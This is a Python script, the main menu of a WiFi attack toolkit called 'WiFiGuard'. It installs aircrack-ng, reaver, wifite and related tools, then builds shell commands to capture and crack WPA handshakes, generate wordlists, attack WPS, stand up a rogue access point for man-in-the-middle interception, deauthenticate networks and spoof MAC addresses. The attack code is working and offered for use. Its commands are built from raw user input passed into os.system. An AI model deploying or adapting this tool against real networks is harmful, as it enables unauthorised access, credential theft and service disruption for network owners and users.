# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
import tools_installer
import deauthenticate_network
from enable_monitor_mode import enable_monitor_mode
from disable_monitor_mode import disable_monitor_mode
from wifi_attack import scan_and_attack
from wifi_password_cracker import crack_wifi_password
from wifi_scanner import scan_wifi
from subprocess import check_call
import rogue_ap
import change_mac_user_input
print("\nInstalling Needed Tools")
print("\n")
cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite hostapd dnsmasq openvpn tor proxychains4 -y")
cmd  = os.system("sleep 3 && clear")
def intro():
    cmd  = os.system("clear")
    print("""\033[1;32m
=========================== WiFiGuard - Main Menu ===========================

 [1]  Start Monitor Mode               
      → Enables monitor mode on your wireless interface for sniffing.

 [2]  Stop Monitor Mode                
      → Disables monitor mode and restores your interface to normal mode.

 [3]  Scan Available Networks          
      → Lists nearby WiFi networks (SSID, signal strength, security).

 [4]  Capture Handshake               
      → Starts packet capture to grab a WPA/WPA2 handshake. (Monitor Mode required)

 [5]  Install Wireless Tools          
      → Installs essential tools like aircrack-ng, reaver, crunch, etc.

 [6]  Crack Handshake (rockyou.txt)   
      → Uses rockyou.txt wordlist to brute-force the captured handshake.

 [7]  Crack Handshake (Custom List)   
      → Specify your own wordlist to crack the handshake.

 [8]  Crack Handshake (No Wordlist/Brute Force)   
      → Uses known default passwords or patterns. (Requires ESSID & Handshake)

 [9]  Create Custom Wordlist          
      → Generates a password list based on user input (names, dates, etc).

 [10] WPS Attack on Network           
      → Attacks WPS-enabled networks using reaver or bully. (BSSID & Monitor Mode required)

 [11] Creating Rougue Access Point           
      → MITM Attack
 
 [12] Deauthenticating Network
      → Making the Wifi-Network unaccessible

 [13] MAC Spoofing
      → Changing permenant mac to temporary mac

 [00] Exit                            
      → Exit the WiFiGuard tool.

============================================================================
""")
    print("\nEnter your choise here : !# ")
    var = int(input(""))
    if var == 1 :
        monitor_iface = enable_monitor_mode()
        if monitor_iface:
            print(f"[✓] Proceeding with monitor interface: {monitor_iface}")
        else:
            print("[✗] Monitor mode setup failed.")
        
        input("\n[↩] Press Enter to continue...")
        intro()

    elif var == 2 :
        if disable_monitor_mode():
            print("[✓] Monitor mode successfully stopped and network-manager restarted.")
        else:
            print("[✗] Monitor mode stop failed or cancelled.")
            
        input("\n[↩] Press Enter to continue...")
        intro()

    elif var == 3 :
        scan_wifi()
        input("\n[↩] Press Enter to continue...")
        intro()
    elif var == 4 :
        scan_and_attack()
        input("\n[↩] Press Enter to continue...")
        intro()
    elif var == 5 :
        tools_installer.main()
        intro()
    
    elif var == 00:
        exit()

    elif var == 6:
        if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            input("\n[↩] Press Enter to continue...")
            intro()

        elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
            cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            input("\n[↩] Press Enter to continue...")
            intro()

    elif var == 7 :
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the path of the wordlist ?")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        exit()
    elif var == 8 :
        crack_wifi_password()
        input("\n[↩] Press Enter to continue...")
        intro()

    elif var == 9 :
        print("\nEnter the minimum length of the password (8/64)?")
        mini = int(input(""))
        print("\nEnter the maximum length of the password (8/64)?")
        max  = int(input(""))
        print("\nEnter the path of the output file?")
        path = str(input(""))
        print("\nEnter what you want the password contain ?")
        password = str(input(""))
        order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
        geny = os.system(order)
        a = ("The wordlist in >>>>> {} Named as SRART").format(path)
        print(a)
    elif var == 10:
        cmd = os.system("clear")
        print("""
1)Reaver
2)Bully
3)wifite (Recommeneded)
4)PixieWps

0) Back to Main Menu
""")
        print("Choose the kind of the attack(External WIFI Adapter Require) ?")
        attack = int(input(""))
        if attack == 1:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -vv").format(interface,bssid)
            geny = os.system(order)
            intro()
        elif attack == 2:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            print("\nEnter the channel of the network ?")
            channel = int(input(""))
            order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
            geny = os.system(order)
            intro()
        elif attack == 3:
            cmd = os.system("wifite")
            intro()
        elif attack == 4:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -K").format(interface,bssid)
            geny = os.system(order)
            intro()
        elif attack == 0 :
            intro()
    elif var == 11:
        rogue_ap.main()
        input("\n[↩] Press Enter to continue...")
        intro()
    elif var == 12:
        deauthenticate_network.main()
        input("\n[↩] Press Enter to continue...")
        intro()
    elif var == 13:
        interface = input("Enter the interface name (e.g., wlan0): ").strip()
        print(f"[+] Starting MAC address changer for {interface}")
        change_mac_user_input.change_mac(interface)
        input("\n[↩] Press Enter to continue...")
        intro()
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro()
